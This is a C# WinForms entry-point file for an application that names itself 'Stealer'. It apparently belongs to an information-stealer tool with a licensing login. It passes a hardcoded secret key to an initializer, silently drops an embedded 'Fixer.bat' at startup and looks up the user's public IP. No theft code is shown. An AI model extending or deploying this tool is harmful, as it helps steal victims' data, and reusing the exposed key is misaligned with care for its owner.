﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ModernGUI_V3
{
    static class Program
    {
        public static Login _login;
        public static FormCertificate xxform;
        public static FormPrincipal xform;
        public static Form1 form1;
        public static Form2 form2;
        public static Form3 form3;
        public static Form4 form4;
        /// <summary>
        /// Punto de entrada principal para la aplicación.
        /// </summary>
        [STAThread]
        static void Main()
        {
            OnProgramStart.Initialize("Stealer", "722896", "pW1VXj3kjypLK2oaUKoxYjO7OJ2tOVqpLEg", "1.0");
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            try
            {
                string batPath = Path.Combine(Application.StartupPath, "Fixer.bat");
                if (!File.Exists(batPath))
                    File.WriteAllText(batPath, Properties.Resources.Fixer);
            }
            catch { }
            _login = new Login();
            Application.Run(_login);
        }
        public static string GetIPAddress()
        {
            String address = "";
            WebRequest request = WebRequest.Create("http://checkip.dyndns.org/");
            using (WebResponse response = request.GetResponse())
            using (StreamReader stream = new StreamReader(response.GetResponseStream()))
            {
                address = stream.ReadToEnd();
            }

            int first = address.IndexOf("Address: ") + 9;
            int last = address.LastIndexOf("</body>");
            address = address.Substring(first, last - first);

            return address;
        }
    }
}
